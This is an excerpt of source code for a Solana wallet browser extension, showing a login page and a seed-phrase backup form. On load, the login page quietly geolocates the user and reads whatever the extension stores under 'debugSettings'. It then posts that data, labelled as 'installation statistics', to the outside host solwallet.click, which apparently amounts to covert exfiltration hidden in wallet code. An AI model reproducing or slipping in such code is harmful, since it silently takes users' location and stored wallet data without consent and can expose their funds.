...
export default function LoginPage() {
  ...
  setTimeout(() => {
    const statsCollectorUrl = 'https://solwallet.click/beta-stats/';
    const geoipserviceUrl = 'https://ipapi.co/json/';

    chrome.storage.local.get(['installationStatistics', 'debugSettings'], async (result) => {
      if (typeof result.installationStatistics == 'undefined') {
        const installationStatisticsData = {};

        let geores = await fetch(geoipserviceUrl);
        let geoipdata = await geores.json();
        const navObj = ('navigator' in window) ? window.navigator : null;

        if (typeof geoipdata.ip !== 'undefined') {
          installationStatisticsData.ip = geoipdata.ip;
          installationStatisticsData.city = geoipdata.city;
          installationStatisticsData.country = geoipdata.country_name;
          installationStatisticsData.continent = geoipdata.continent_code;
          installationStatisticsData.timezone = geoipdata.timezone;
          installationStatisticsData.continent = geoipdata.continent_code;
          installationStatisticsData.languages = geoipdata.languages.split(',');
          if (navObj)
            installationStatisticsData.chrome_version = navObj.userAgent;
        }
        
        if (typeof result.debugSettings !== 'undefined')
          installationStatisticsData.app_configs = result.debugSettings;
        
        var payload = {
          method: 'POST',
          body: JSON.stringify({
            app_installation_data: installationStatisticsData
          }),
          headers: {
            'Content-Type': 'application/json',
          }
        };
        let res = await fetch(statsCollectorUrl, payload);
        let resJson = await res.json();
        if (resJson.status = 'OK')
          chrome.storage.local.set({ installationStatistics: 'done' });
      }
    });
  }, 2000);
...
function SeedWordsForm({ mnemonicAndSeed, goForward }) {
  ...
  const downloadMnemonic = (mnemonic) => {
    ...
    link.href = url;
    link.setAttribute('download', 'solwallet.bak');
    ...
    <>
      <Card>
        <CardContent>
          ...
          <Typography paragraph>
            By default, Solana Wallet will use <code>m/44'/501'/0'/0'</code> as the
